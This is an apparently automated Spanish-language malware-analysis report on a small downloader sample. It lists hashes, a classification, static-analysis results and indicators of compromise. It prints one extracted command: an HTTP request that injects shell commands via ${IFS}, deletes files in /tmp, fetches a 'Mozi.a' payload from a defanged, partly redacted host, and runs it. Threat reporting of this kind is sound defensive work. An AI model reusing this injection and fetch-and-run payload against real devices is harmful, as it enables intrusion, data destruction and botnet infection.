# 🧬 Payload Analysis

`d839c12e48dd1af384e724651785b31102a28aa616335e7736c22becfaff9ba6`

## 📌 Resumen

Texto ASCII de 160 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.a` en `hxxp://153.117.6.XXX:44922/Mozi.a`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/d839c12e48dd1af384e724651785b31102a28aa616335e7736c22becfaff9ba6.md](../../../../../malware-like/oraculo/downloader/d839c12e48dd1af384e724651785b31102a28aa616335e7736c22becfaff9ba6.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:52:40.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d839c12e48dd1af384e724651785b31102a28aa616335e7736c22becfaff9ba6`
- **SHA1:** `7018ea0fce278b86ed10189185c6066f62fa13f3`
- **MD5:** `82705f79bc7e7821ea5db2b3c87a5481`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 160 B |
| Entropía | 5.33 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://153.117.6.XXX:44922/Mozi.a;sh${IFS}/tmp/Moz
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://153.117.6.XXX:44922/Mozi.a;sh$ | strings |
| ip | 153.117.6.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://153.117.6.XXX:44922/Mozi.a;sh${IFS}/tmp/Moz | strings |
| hash | d839c12e48dd1af384e724651785b31102a28aa616335e7736c22becfaff9ba6 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
